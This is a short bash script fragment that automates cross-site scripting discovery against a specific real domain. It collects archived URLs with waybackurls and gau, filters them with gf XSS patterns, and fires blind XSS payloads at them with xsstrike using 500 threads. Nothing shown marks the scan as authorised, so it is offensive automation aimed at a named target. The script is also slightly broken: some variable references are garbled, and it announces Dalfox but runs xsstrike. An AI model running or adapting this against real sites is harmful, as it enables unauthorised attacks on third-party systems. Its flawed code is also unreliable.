echo -e "\nFinding URLs for $1 using Waybackurls ...."

    echo aetna.com | waybackurls | tee aetna.com.txt >/dev/null 2>&1;
    printf "URLS fetched using waybackurls & Stored in $blueaetna.com.txt$end"
    printf "\n\nFinding URLs for $1 using gau ....\n"
    echo aetna.com | gau | tee -a aetna.com.txt >/dev/null 2>&1;
    printf "URLS fetched using gau & appended in $blue$aetna.com$end \n\n"

    echo -e "\nFinding valid URLs for XSS using GF Patterns \n"

    cat aetna.com.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee aetna.com_temp_xss.txt >/dev/null 2>&1;

    sort aetna.com_temp_xss.txt | uniq | tee aetna.com_xss.txt >/dev/null 2>&1;
    printf "\nXSS Vulnerable URL's added to $blueaetna.com_xss.txt$end\n\n"
    
    echo "XSS Automation Started using Dalfox.."
    
    python3 xsstrike.py --seeds aetna.com_xss.txt --blind --params -t 500
